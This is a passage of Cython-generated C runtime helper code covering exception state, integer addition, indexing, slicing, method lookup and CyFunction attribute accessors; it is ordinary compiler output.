    local_value = tstate->curexc_value;
    local_tb = tstate->curexc_traceback;
    tstate->curexc_type = 0;
    tstate->curexc_value = 0;
    tstate->curexc_traceback = 0;
#else
    PyErr_Fetch(&local_type, &local_value, &local_tb);
#endif
    PyErr_NormalizeException(&local_type, &local_value, &local_tb);
#if CYTHON_FAST_THREAD_STATE
    if (unlikely(tstate->curexc_type))
#else
    if (unlikely(PyErr_Occurred()))
#endif
        goto bad;
    #if PY_MAJOR_VERSION >= 3
    if (local_tb) {
        if (unlikely(PyException_SetTraceback(local_value, local_tb) < 0))
            goto bad;
    }
    #endif
    Py_XINCREF(local_tb);
    Py_XINCREF(local_type);
    Py_XINCREF(local_value);
    *type = local_type;
    *value = local_value;
    *tb = local_tb;
#if CYTHON_FAST_THREAD_STATE
    #if CYTHON_USE_EXC_INFO_STACK
    {
        _PyErr_StackItem *exc_info = tstate->exc_info;
        tmp_type = exc_info->exc_type;
        tmp_value = exc_info->exc_value;
        tmp_tb = exc_info->exc_traceback;
        exc_info->exc_type = local_type;
        exc_info->exc_value = local_value;
        exc_info->exc_traceback = local_tb;
    }
    #else
    tmp_type = tstate->exc_type;
    tmp_value = tstate->exc_value;
    tmp_tb = tstate->exc_traceback;
    tstate->exc_type = local_type;
    tstate->exc_value = local_value;
    tstate->exc_traceback = local_tb;
    #endif
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
#else
    PyErr_SetExcInfo(local_type, local_value, local_tb);
#endif
    return 0;
bad:
    *type = 0;
    *value = 0;
    *tb = 0;
    Py_XDECREF(local_type);
    Py_XDECREF(local_value);
    Py_XDECREF(local_tb);
    return -1;
}

 
#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    tmp_type = tstate->curexc_type;
    tmp_value = tstate->curexc_value;
    tmp_tb = tstate->curexc_traceback;
    tstate->curexc_type = type;
    tstate->curexc_value = value;
    tstate->curexc_traceback = tb;
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
}
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
    *type = tstate->curexc_type;
    *value = tstate->curexc_value;
    *tb = tstate->curexc_traceback;
    tstate->curexc_type = 0;
    tstate->curexc_value = 0;
    tstate->curexc_traceback = 0;
}
#endif

 
#if PY_MAJOR_VERSION >= 3 && !CYTHON_COMPILING_IN_PYPY
static PyObject *__Pyx_PyDict_GetItem(PyObject *d, PyObject* key) {
    PyObject *value;
    value = PyDict_GetItemWithError(d, key);
    if (unlikely(!value)) {
        if (!PyErr_Occurred()) {
            if (unlikely(PyTuple_Check(key))) {
                PyObject* args = PyTuple_Pack(1, key);
                if (likely(args)) {
                    PyErr_SetObject(PyExc_KeyError, args);
                    Py_DECREF(args);
                }
            } else {
                PyErr_SetObject(PyExc_KeyError, key);
            }
        }
        return NULL;
    }
    Py_INCREF(value);
    return value;
}
#endif

 
static CYTHON_UNUSED PyObject* __Pyx_PyObject_Call2Args(PyObject* function, PyObject* arg1, PyObject* arg2) {
    PyObject *args, *result = NULL;
    #if CYTHON_FAST_PYCALL
    if (PyFunction_Check(function)) {
        PyObject *args[2] = {arg1, arg2};
        return __Pyx_PyFunction_FastCall(function, args, 2);
    }
    #endif
    #if CYTHON_FAST_PYCCALL
    if (__Pyx_PyFastCFunction_Check(function)) {
        PyObject *args[2] = {arg1, arg2};
        return __Pyx_PyCFunction_FastCall(function, args, 2);
    }
    #endif
    args = PyTuple_New(2);
    if (unlikely(!args)) goto done;
    Py_INCREF(arg1);
    PyTuple_SET_ITEM(args, 0, arg1);
    Py_INCREF(arg2);
    PyTuple_SET_ITEM(args, 1, arg2);
    Py_INCREF(function);
    result = __Pyx_PyObject_Call(function, args, NULL);
    Py_DECREF(args);
    Py_DECREF(function);
done:
    return result;
}

 
#if !CYTHON_COMPILING_IN_PYPY
static PyObject* __Pyx_PyInt_AddObjC(PyObject *op1, PyObject *op2, CYTHON_UNUSED long intval, int inplace, int zerodivision_check) {
    (void)inplace;
    (void)zerodivision_check;
    #if PY_MAJOR_VERSION < 3
    if (likely(PyInt_CheckExact(op1))) {
        const long b = intval;
        long x;
        long a = PyInt_AS_LONG(op1);
            x = (long)((unsigned long)a + b);
            if (likely((x^a) >= 0 || (x^b) >= 0))
                return PyInt_FromLong(x);
            return PyLong_Type.tp_as_number->nb_add(op1, op2);
    }
    #endif
    #if CYTHON_USE_PYLONG_INTERNALS
    if (likely(PyLong_CheckExact(op1))) {
        const long b = intval;
        long a, x;
#ifdef HAVE_LONG_LONG
        const PY_LONG_LONG llb = intval;
        PY_LONG_LONG lla, llx;
#endif
        const digit* digits = ((PyLongObject*)op1)->ob_digit;
        const Py_ssize_t size = Py_SIZE(op1);
        if (likely(__Pyx_sst_abs(size) <= 1)) {
            a = likely(size) ? digits[0] : 0;
            if (size == -1) a = -a;
        } else {
            switch (size) {
                case -2:
                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                        a = -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 2 * PyLong_SHIFT) {
                        lla = -(PY_LONG_LONG) (((((unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                case 2:
                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                        a = (long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 2 * PyLong_SHIFT) {
                        lla = (PY_LONG_LONG) (((((unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                case -3:
                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                        a = -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 3 * PyLong_SHIFT) {
                        lla = -(PY_LONG_LONG) (((((((unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                case 3:
                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                        a = (long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 3 * PyLong_SHIFT) {
                        lla = (PY_LONG_LONG) (((((((unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                case -4:
                    if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                        a = -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 4 * PyLong_SHIFT) {
                        lla = -(PY_LONG_LONG) (((((((((unsigned PY_LONG_LONG)digits[3]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                case 4:
                    if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                        a = (long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 4 * PyLong_SHIFT) {
                        lla = (PY_LONG_LONG) (((((((((unsigned PY_LONG_LONG)digits[3]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                default: return PyLong_Type.tp_as_number->nb_add(op1, op2);
            }
        }
                x = a + b;
            return PyLong_FromLong(x);
#ifdef HAVE_LONG_LONG
        long_long:
                llx = lla + llb;
            return PyLong_FromLongLong(llx);
#endif
        
        
    }
    #endif
    if (PyFloat_CheckExact(op1)) {
        const long b = intval;
        double a = PyFloat_AS_DOUBLE(op1);
            double result;
            PyFPE_START_PROTECT("add", return NULL)
            result = ((double)a) + (double)b;
            PyFPE_END_PROTECT(result)
            return PyFloat_FromDouble(result);
    }
    return (inplace ? PyNumber_InPlaceAdd : PyNumber_Add)(op1, op2);
}
#endif

 
static PyObject *__Pyx_GetItemInt_Generic(PyObject *o, PyObject* j) {
    PyObject *r;
    if (!j) return NULL;
    r = PyObject_GetItem(o, j);
    Py_DECREF(j);
    return r;
}
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_List_Fast(PyObject *o, Py_ssize_t i,
                                                              CYTHON_NCP_UNUSED int wraparound,
                                                              CYTHON_NCP_UNUSED int boundscheck) {
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    Py_ssize_t wrapped_i = i;
    if (wraparound & unlikely(i < 0)) {
        wrapped_i += PyList_GET_SIZE(o);
    }
    if ((!boundscheck) || likely(__Pyx_is_valid_index(wrapped_i, PyList_GET_SIZE(o)))) {
        PyObject *r = PyList_GET_ITEM(o, wrapped_i);
        Py_INCREF(r);
        return r;
    }
    return __Pyx_GetItemInt_Generic(o, PyInt_FromSsize_t(i));
#else
    return PySequence_GetItem(o, i);
#endif
}
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_Tuple_Fast(PyObject *o, Py_ssize_t i,
                                                              CYTHON_NCP_UNUSED int wraparound,
                                                              CYTHON_NCP_UNUSED int boundscheck) {
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    Py_ssize_t wrapped_i = i;
    if (wraparound & unlikely(i < 0)) {
        wrapped_i += PyTuple_GET_SIZE(o);
    }
    if ((!boundscheck) || likely(__Pyx_is_valid_index(wrapped_i, PyTuple_GET_SIZE(o)))) {
        PyObject *r = PyTuple_GET_ITEM(o, wrapped_i);
        Py_INCREF(r);
        return r;
    }
    return __Pyx_GetItemInt_Generic(o, PyInt_FromSsize_t(i));
#else
    return PySequence_GetItem(o, i);
#endif
}
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_Fast(PyObject *o, Py_ssize_t i, int is_list,
                                                     CYTHON_NCP_UNUSED int wraparound,
                                                     CYTHON_NCP_UNUSED int boundscheck) {
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS && CYTHON_USE_TYPE_SLOTS
    if (is_list || PyList_CheckExact(o)) {
        Py_ssize_t n = ((!wraparound) | likely(i >= 0)) ? i : i + PyList_GET_SIZE(o);
        if ((!boundscheck) || (likely(__Pyx_is_valid_index(n, PyList_GET_SIZE(o))))) {
            PyObject *r = PyList_GET_ITEM(o, n);
            Py_INCREF(r);
            return r;
        }
    }
    else if (PyTuple_CheckExact(o)) {
        Py_ssize_t n = ((!wraparound) | likely(i >= 0)) ? i : i + PyTuple_GET_SIZE(o);
        if ((!boundscheck) || likely(__Pyx_is_valid_index(n, PyTuple_GET_SIZE(o)))) {
            PyObject *r = PyTuple_GET_ITEM(o, n);
            Py_INCREF(r);
            return r;
        }
    } else {
        PySequenceMethods *m = Py_TYPE(o)->tp_as_sequence;
        if (likely(m && m->sq_item)) {
            if (wraparound && unlikely(i < 0) && likely(m->sq_length)) {
                Py_ssize_t l = m->sq_length(o);
                if (likely(l >= 0)) {
                    i += l;
                } else {
                    if (!PyErr_ExceptionMatches(PyExc_OverflowError))
                        return NULL;
                    PyErr_Clear();
                }
            }
            return m->sq_item(o, i);
        }
    }
#else
    if (is_list || PySequence_Check(o)) {
        return PySequence_GetItem(o, i);
    }
#endif
    return __Pyx_GetItemInt_Generic(o, PyInt_FromSsize_t(i));
}

 
#if CYTHON_USE_TYPE_SLOTS
static PyObject *__Pyx_PyObject_GetIndex(PyObject *obj, PyObject* index) {
    PyObject *runerr = NULL;
    Py_ssize_t key_value;
    PySequenceMethods *m = Py_TYPE(obj)->tp_as_sequence;
    if (unlikely(!(m && m->sq_item))) {
        PyErr_Format(PyExc_TypeError, "'%.200s' object is not subscriptable", Py_TYPE(obj)->tp_name);
        return NULL;
    }
    key_value = __Pyx_PyIndex_AsSsize_t(index);
    if (likely(key_value != -1 || !(runerr = PyErr_Occurred()))) {
        return __Pyx_GetItemInt_Fast(obj, key_value, 0, 1, 1);
    }
    if (PyErr_GivenExceptionMatches(runerr, PyExc_OverflowError)) {
        PyErr_Clear();
        PyErr_Format(PyExc_IndexError, "cannot fit '%.200s' into an index-sized integer", Py_TYPE(index)->tp_name);
    }
    return NULL;
}
static PyObject *__Pyx_PyObject_GetItem(PyObject *obj, PyObject* key) {
    PyMappingMethods *m = Py_TYPE(obj)->tp_as_mapping;
    if (likely(m && m->mp_subscript)) {
        return m->mp_subscript(obj, key);
    }
    return __Pyx_PyObject_GetIndex(obj, key);
}
#endif

 
static int __Pyx_PyObject_GetMethod(PyObject *obj, PyObject *name, PyObject **method) {
    PyObject *attr;
#if CYTHON_UNPACK_METHODS && CYTHON_COMPILING_IN_CPYTHON && CYTHON_USE_PYTYPE_LOOKUP
    PyTypeObject *tp = Py_TYPE(obj);
    PyObject *descr;
    descrgetfunc f = NULL;
    PyObject **dictptr, *dict;
    int meth_found = 0;
    assert (*method == NULL);
    if (unlikely(tp->tp_getattro != PyObject_GenericGetAttr)) {
        attr = __Pyx_PyObject_GetAttrStr(obj, name);
        goto try_unpack;
    }
    if (unlikely(tp->tp_dict == NULL) && unlikely(PyType_Ready(tp) < 0)) {
        return 0;
    }
    descr = _PyType_Lookup(tp, name);
    if (likely(descr != NULL)) {
        Py_INCREF(descr);
#if PY_MAJOR_VERSION >= 3
        #ifdef __Pyx_CyFunction_USED
        if (likely(PyFunction_Check(descr) || (Py_TYPE(descr) == &PyMethodDescr_Type) || __Pyx_CyFunction_Check(descr)))
        #else
        if (likely(PyFunction_Check(descr) || (Py_TYPE(descr) == &PyMethodDescr_Type)))
        #endif
#else
        #ifdef __Pyx_CyFunction_USED
        if (likely(PyFunction_Check(descr) || __Pyx_CyFunction_Check(descr)))
        #else
        if (likely(PyFunction_Check(descr)))
        #endif
#endif
        {
            meth_found = 1;
        } else {
            f = Py_TYPE(descr)->tp_descr_get;
            if (f != NULL && PyDescr_IsData(descr)) {
                attr = f(descr, obj, (PyObject *)Py_TYPE(obj));
                Py_DECREF(descr);
                goto try_unpack;
            }
        }
    }
    dictptr = _PyObject_GetDictPtr(obj);
    if (dictptr != NULL && (dict = *dictptr) != NULL) {
        Py_INCREF(dict);
        attr = __Pyx_PyDict_GetItemStr(dict, name);
        if (attr != NULL) {
            Py_INCREF(attr);
            Py_DECREF(dict);
            Py_XDECREF(descr);
            goto try_unpack;
        }
        Py_DECREF(dict);
    }
    if (meth_found) {
        *method = descr;
        return 1;
    }
    if (f != NULL) {
        attr = f(descr, obj, (PyObject *)Py_TYPE(obj));
        Py_DECREF(descr);
        goto try_unpack;
    }
    if (descr != NULL) {
        *method = descr;
        return 0;
    }
    PyErr_Format(PyExc_AttributeError,
#if PY_MAJOR_VERSION >= 3
                 "'%.50s' object has no attribute '%U'",
                 tp->tp_name, name);
#else
                 "'%.50s' object has no attribute '%.400s'",
                 tp->tp_name, PyString_AS_STRING(name));
#endif
    return 0;
#else
    attr = __Pyx_PyObject_GetAttrStr(obj, name);
    goto try_unpack;
#endif
try_unpack:
#if CYTHON_UNPACK_METHODS
    if (likely(attr) && PyMethod_Check(attr) && likely(PyMethod_GET_SELF(attr) == obj)) {
        PyObject *function = PyMethod_GET_FUNCTION(attr);
        Py_INCREF(function);
        Py_DECREF(attr);
        *method = function;
        return 1;
    }
#endif
    *method = attr;
    return 0;
}

 
static PyObject* __Pyx__PyObject_CallMethod1(PyObject* method, PyObject* arg) {
    PyObject *result = __Pyx_PyObject_CallOneArg(method, arg);
    Py_DECREF(method);
    return result;
}
static PyObject* __Pyx_PyObject_CallMethod1(PyObject* obj, PyObject* method_name, PyObject* arg) {
    PyObject *method = NULL, *result;
    int is_method = __Pyx_PyObject_GetMethod(obj, method_name, &method);
    if (likely(is_method)) {
        result = __Pyx_PyObject_Call2Args(method, obj, arg);
        Py_DECREF(method);
        return result;
    }
    if (unlikely(!method)) return NULL;
    return __Pyx__PyObject_CallMethod1(method, arg);
}

 
static CYTHON_INLINE int __Pyx_PyObject_Append(PyObject* L, PyObject* x) {
    if (likely(PyList_CheckExact(L))) {
        if (unlikely(__Pyx_PyList_Append(L, x) < 0)) return -1;
    } else {
        PyObject* retval = __Pyx_PyObject_CallMethod1(L, __pyx_n_s_append, x);
        if (unlikely(!retval))
            return -1;
        Py_DECREF(retval);
    }
    return 0;
}

 
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetSlice(PyObject* obj,
        Py_ssize_t cstart, Py_ssize_t cstop,
        PyObject** _py_start, PyObject** _py_stop, PyObject** _py_slice,
        int has_cstart, int has_cstop, CYTHON_UNUSED int wraparound) {
#if CYTHON_USE_TYPE_SLOTS
    PyMappingMethods* mp;
#if PY_MAJOR_VERSION < 3
    PySequenceMethods* ms = Py_TYPE(obj)->tp_as_sequence;
    if (likely(ms && ms->sq_slice)) {
        if (!has_cstart) {
            if (_py_start && (*_py_start != Py_None)) {
                cstart = __Pyx_PyIndex_AsSsize_t(*_py_start);
                if ((cstart == (Py_ssize_t)-1) && PyErr_Occurred()) goto bad;
            } else
                cstart = 0;
        }
        if (!has_cstop) {
            if (_py_stop && (*_py_stop != Py_None)) {
                cstop = __Pyx_PyIndex_AsSsize_t(*_py_stop);
                if ((cstop == (Py_ssize_t)-1) && PyErr_Occurred()) goto bad;
            } else
                cstop = PY_SSIZE_T_MAX;
        }
        if (wraparound && unlikely((cstart < 0) | (cstop < 0)) && likely(ms->sq_length)) {
            Py_ssize_t l = ms->sq_length(obj);
            if (likely(l >= 0)) {
                if (cstop < 0) {
                    cstop += l;
                    if (cstop < 0) cstop = 0;
                }
                if (cstart < 0) {
                    cstart += l;
                    if (cstart < 0) cstart = 0;
                }
            } else {
                if (!PyErr_ExceptionMatches(PyExc_OverflowError))
                    goto bad;
                PyErr_Clear();
            }
        }
        return ms->sq_slice(obj, cstart, cstop);
    }
#endif
    mp = Py_TYPE(obj)->tp_as_mapping;
    if (likely(mp && mp->mp_subscript))
#endif
    {
        PyObject* result;
        PyObject *py_slice, *py_start, *py_stop;
        if (_py_slice) {
            py_slice = *_py_slice;
        } else {
            PyObject* owned_start = NULL;
            PyObject* owned_stop = NULL;
            if (_py_start) {
                py_start = *_py_start;
            } else {
                if (has_cstart) {
                    owned_start = py_start = PyInt_FromSsize_t(cstart);
                    if (unlikely(!py_start)) goto bad;
                } else
                    py_start = Py_None;
            }
            if (_py_stop) {
                py_stop = *_py_stop;
            } else {
                if (has_cstop) {
                    owned_stop = py_stop = PyInt_FromSsize_t(cstop);
                    if (unlikely(!py_stop)) {
                        Py_XDECREF(owned_start);
                        goto bad;
                    }
                } else
                    py_stop = Py_None;
            }
            py_slice = PySlice_New(py_start, py_stop, Py_None);
            Py_XDECREF(owned_start);
            Py_XDECREF(owned_stop);
            if (unlikely(!py_slice)) goto bad;
        }
#if CYTHON_USE_TYPE_SLOTS
        result = mp->mp_subscript(obj, py_slice);
#else
        result = PyObject_GetItem(obj, py_slice);
#endif
        if (!_py_slice) {
            Py_DECREF(py_slice);
        }
        return result;
    }
    PyErr_Format(PyExc_TypeError,
        "'%.200s' object is unsliceable", Py_TYPE(obj)->tp_name);
bad:
    return NULL;
}

 
static CYTHON_INLINE int __Pyx_PyObject_SetSlice(PyObject* obj, PyObject* value,
        Py_ssize_t cstart, Py_ssize_t cstop,
        PyObject** _py_start, PyObject** _py_stop, PyObject** _py_slice,
        int has_cstart, int has_cstop, CYTHON_UNUSED int wraparound) {
#if CYTHON_USE_TYPE_SLOTS
    PyMappingMethods* mp;
#if PY_MAJOR_VERSION < 3
    PySequenceMethods* ms = Py_TYPE(obj)->tp_as_sequence;
    if (likely(ms && ms->sq_ass_slice)) {
        if (!has_cstart) {
            if (_py_start && (*_py_start != Py_None)) {
                cstart = __Pyx_PyIndex_AsSsize_t(*_py_start);
                if ((cstart == (Py_ssize_t)-1) && PyErr_Occurred()) goto bad;
            } else
                cstart = 0;
        }
        if (!has_cstop) {
            if (_py_stop && (*_py_stop != Py_None)) {
                cstop = __Pyx_PyIndex_AsSsize_t(*_py_stop);
                if ((cstop == (Py_ssize_t)-1) && PyErr_Occurred()) goto bad;
            } else
                cstop = PY_SSIZE_T_MAX;
        }
        if (wraparound && unlikely((cstart < 0) | (cstop < 0)) && likely(ms->sq_length)) {
            Py_ssize_t l = ms->sq_length(obj);
            if (likely(l >= 0)) {
                if (cstop < 0) {
                    cstop += l;
                    if (cstop < 0) cstop = 0;
                }
                if (cstart < 0) {
                    cstart += l;
                    if (cstart < 0) cstart = 0;
                }
            } else {
                if (!PyErr_ExceptionMatches(PyExc_OverflowError))
                    goto bad;
                PyErr_Clear();
            }
        }
        return ms->sq_ass_slice(obj, cstart, cstop, value);
    }
#endif
    mp = Py_TYPE(obj)->tp_as_mapping;
    if (likely(mp && mp->mp_ass_subscript))
#endif
    {
        int result;
        PyObject *py_slice, *py_start, *py_stop;
        if (_py_slice) {
            py_slice = *_py_slice;
        } else {
            PyObject* owned_start = NULL;
            PyObject* owned_stop = NULL;
            if (_py_start) {
                py_start = *_py_start;
            } else {
                if (has_cstart) {
                    owned_start = py_start = PyInt_FromSsize_t(cstart);
                    if (unlikely(!py_start)) goto bad;
                } else
                    py_start = Py_None;
            }
            if (_py_stop) {
                py_stop = *_py_stop;
            } else {
                if (has_cstop) {
                    owned_stop = py_stop = PyInt_FromSsize_t(cstop);
                    if (unlikely(!py_stop)) {
                        Py_XDECREF(owned_start);
                        goto bad;
                    }
                } else
                    py_stop = Py_None;
            }
            py_slice = PySlice_New(py_start, py_stop, Py_None);
            Py_XDECREF(owned_start);
            Py_XDECREF(owned_stop);
            if (unlikely(!py_slice)) goto bad;
        }
#if CYTHON_USE_TYPE_SLOTS
        result = mp->mp_ass_subscript(obj, py_slice, value);
#else
        result = value ? PyObject_SetItem(obj, py_slice, value) : PyObject_DelItem(obj, py_slice);
#endif
        if (!_py_slice) {
            Py_DECREF(py_slice);
        }
        return result;
    }
    PyErr_Format(PyExc_TypeError,
        "'%.200s' object does not support slice %.10s",
        Py_TYPE(obj)->tp_name, value ? "assignment" : "deletion");
bad:
    return -1;
}

 
static PyTypeObject* __Pyx_FetchCommonType(PyTypeObject* type) {
    PyObject* fake_module;
    PyTypeObject* cached_type = NULL;
    fake_module = PyImport_AddModule((char*) "_cython_" CYTHON_ABI);
    if (!fake_module) return NULL;
    Py_INCREF(fake_module);
    cached_type = (PyTypeObject*) PyObject_GetAttrString(fake_module, type->tp_name);
    if (cached_type) {
        if (!PyType_Check((PyObject*)cached_type)) {
            PyErr_Format(PyExc_TypeError,
                "Shared Cython type %.200s is not a type object",
                type->tp_name);
            goto bad;
        }
        if (cached_type->tp_basicsize != type->tp_basicsize) {
            PyErr_Format(PyExc_TypeError,
                "Shared Cython type %.200s has the wrong size, try recompiling",
                type->tp_name);
            goto bad;
        }
    } else {
        if (!PyErr_ExceptionMatches(PyExc_AttributeError)) goto bad;
        PyErr_Clear();
        if (PyType_Ready(type) < 0) goto bad;
        if (PyObject_SetAttrString(fake_module, type->tp_name, (PyObject*) type) < 0)
            goto bad;
        Py_INCREF(type);
        cached_type = type;
    }
done:
    Py_DECREF(fake_module);
    return cached_type;
bad:
    Py_XDECREF(cached_type);
    cached_type = NULL;
    goto done;
}

 
#include <structmember.h>
static PyObject *
__Pyx_CyFunction_get_doc(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *closure)
{
    if (unlikely(op->func_doc == NULL)) {
        if (op->func.m_ml->ml_doc) {
#if PY_MAJOR_VERSION >= 3
            op->func_doc = PyUnicode_FromString(op->func.m_ml->ml_doc);
#else
            op->func_doc = PyString_FromString(op->func.m_ml->ml_doc);
#endif
            if (unlikely(op->func_doc == NULL))
                return NULL;
        } else {
            Py_INCREF(Py_None);
            return Py_None;
        }
    }
    Py_INCREF(op->func_doc);
    return op->func_doc;
}
static int
__Pyx_CyFunction_set_doc(__pyx_CyFunctionObject *op, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp = op->func_doc;
    if (value == NULL) {
        value = Py_None;
    }
    Py_INCREF(value);
    op->func_doc = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_name(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    if (unlikely(op->func_name == NULL)) {
#if PY_MAJOR_VERSION >= 3
        op->func_name = PyUnicode_InternFromString(op->func.m_ml->ml_name);
#else
        op->func_name = PyString_InternFromString(op->func.m_ml->ml_name);
#endif
        if (unlikely(op->func_name == NULL))
            return NULL;
    }
    Py_INCREF(op->func_name);
    return op->func_name;
}
static int
__Pyx_CyFunction_set_name(__pyx_CyFunctionObject *op, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp;
#if PY_MAJOR_VERSION >= 3
    if (unlikely(value == NULL || !PyUnicode_Check(value)))
#else
    if (unlikely(value == NULL || !PyString_Check(value)))
#endif
    {
        PyErr_SetString(PyExc_TypeError,
                        "__name__ must be set to a string object");
        return -1;
    }
    tmp = op->func_name;
    Py_INCREF(value);
    op->func_name = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_qualname(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    Py_INCREF(op->func_qualname);
    return op->func_qualname;
}
static int
__Pyx_CyFunction_set_qualname(__pyx_CyFunctionObject *op, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp;
#if PY_MAJOR_VERSION >= 3
    if (unlikely(value == NULL || !PyUnicode_Check(value)))
#else
    if (unlikely(value == NULL || !PyString_Check(value)))
#endif
    {
        PyErr_SetString(PyExc_TypeError,
                        "__qualname__ must be set to a string object");
        return -1;
    }
    tmp = op->func_qualname;
    Py_INCREF(value);
    op->func_qualname = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_self(__pyx_CyFunctionObject *m, CYTHON_UNUSED void *closure)
{
    PyObject *self;
    self = m->func_closure;
    if (self == NULL)
        self = Py_None;
    Py_INCREF(self);
    return self;
}
static PyObject *
__Pyx_CyFunction_get_dict(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    if (unlikely(op->func_dict == NULL)) {
        op->func_dict = PyDict_New();
        if (unlikely(op->func_dict == NULL))
            return NULL;
    }
    Py_INCREF(op->func_dict);
    return op->func_dict;
}
static int
__Pyx_CyFunction_set_dict(__pyx_CyFunctionObject *op, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp;
    if (unlikely(value == NULL)) {
        PyErr_SetString(PyExc_TypeError,
               "function's dictionary may not be deleted");
        return -1;
    }
    if (unlikely(!PyDict_Check(value))) {
        PyErr_SetString(PyExc_TypeError,
               "setting function's dictionary to a non-dict");
        return -1;
    }
    tmp = op->func_dict;
    Py_INCREF(value);
    op->func_dict = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_globals(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    Py_INCREF(op->func_globals);
    return op->func_globals;
}
static PyObject *
__Pyx_CyFunction_get_closure(CYTHON_UNUSED __pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    Py_INCREF(Py_None);
    return Py_None;
}
static PyObject *
__Pyx_CyFunction_get_code(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    PyObject* result = (op->func_code) ? op->func_code : Py_None;
    Py_INCREF(result);
    return result;
}
static int
__Pyx_CyFunction_init_defaults(__pyx_CyFunctionObject *op) {
    int result = 0;
    PyObject *res = op->defaults_getter((PyObject *) op);
    if (unlikely(!res))
        return -1;
    #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    op->defaults_tuple = PyTuple_GET_ITEM(res, 0);
    Py_INCREF(op->defaults_tuple);
    op->defaults_kwdict = PyTuple_GET_ITEM(res, 1);
    Py_INCREF(op->defaults_kwdict);
    #else
    op->defaults_tuple = PySequence_ITEM(res, 0);
    if (unlikely(!op->defaults_tuple)) result = -1;
    else {
